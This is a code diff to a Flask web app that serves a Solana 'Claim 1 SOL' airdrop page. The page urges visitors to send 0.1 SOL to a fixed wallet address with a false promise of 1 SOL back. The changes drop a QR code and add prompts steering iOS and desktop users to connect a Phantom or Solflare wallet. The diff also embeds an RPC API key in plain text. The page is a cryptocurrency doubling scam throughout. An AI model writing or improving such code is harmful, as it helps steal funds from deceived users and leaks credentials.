@@ -3,7 +3,6 @@ from flask import Flask, render_template_string
 app = Flask(__name__)
 
 WALLET_ADDRESS = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
-QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -33,13 +32,6 @@ HTML_TEMPLATE = """
       cursor: pointer;
       margin: 20px;
     }
-    img.qr {
-      width: 220px;
-      margin: 20px auto;
-      border-radius: 16px;
-      box-shadow: 0 0 20px #00ff90;
-      display: none;
-    }
     #status {
       margin-top: 20px;
       color: #ccc;
@@ -55,17 +47,14 @@ HTML_TEMPLATE = """
   </style>
 </head>
 <body>
-  <body>
   <h1>🎁 Claim 1 SOL – Be Fast!</h1>
   <div class="highlight-box">
     <p>🚨 <strong>Limited-Time Airdrop!</strong></p>
     <p>Send exactly <strong>0.1 SOL</strong> to the wallet below, and get back <strong>1 SOL</strong> instantly.</p>
     <p>Why? We're testing our reward bot — and first users win big! 🧠✨</p>
-    <p>💡 _If you're seeing this, it's still live. Don't miss it._</p>
+    <p>💡 <em>If you're seeing this, it's still live. Don't miss it.</em></p>
     <p><strong>Wallet Address:</strong><br><code>{{ wallet }}</code></p>
   </div>
-
-  <img id="qrCode" class="qr" src="{{ qr_url }}" alt="QR Code" />
 
   <div>
     <button class="button" id="connectBtn">🔗 Connect Wallet</button>
@@ -80,7 +69,6 @@ HTML_TEMPLATE = """
 
   <script>
     const status = document.getElementById("status");
-    const qr = document.getElementById("qrCode");
     const connectBtn = document.getElementById("connectBtn");
     const claimBtn = document.getElementById("claimBtn");
     const networkSelect = document.getElementById("networkSelect");
@@ -89,13 +77,21 @@ HTML_TEMPLATE = """
     let publicKey = null;
 
     connectBtn.addEventListener('click', async () => {
+      const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
+      const isDesktop = !isIOS && !/Android/.test(navigator.userAgent);
+
       if (window.solana?.isPhantom) {
         provider = window.solana;
       } else if (window.solflare?.isSolflare) {
         provider = window.solflare;
       } else {
-        status.innerText = "⚠️ No wallet detected. Open this in Phantom or Solflare.";
-        qr.style.display = "block";
+        if (isIOS) {
+          status.innerText = "📱 Please open this site inside the Phantom or Solflare mobile app browser.";
+        } else if (isDesktop) {
+          status.innerText = "💻 Please install the Phantom or Solflare browser extension and refresh this page.";
+        } else {
+          status.innerText = "⚠️ No wallet detected. Use Phantom or Solflare.";
+        }
         return;
       }
 
@@ -119,7 +115,6 @@ HTML_TEMPLATE = """
 
       const network = networkSelect.value;
 
-      // Use CORS-compatible RPC endpoints
       const customRPC = {
         "mainnet-beta": "https://mainnet.helius-rpc.com/?api-key=9867d904-fdcc-46b7-b5b1-c9ae880bd41d",
         "devnet": "https://api.devnet.solana.com"
@@ -159,7 +154,7 @@ HTML_TEMPLATE = """
 
 @app.route("/")
 def index():
-    return render_template_string(HTML_TEMPLATE, wallet=WALLET_ADDRESS, qr_url=QR_CODE_URL)
+    return render_template_string(HTML_TEMPLATE, wallet=WALLET_ADDRESS)
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
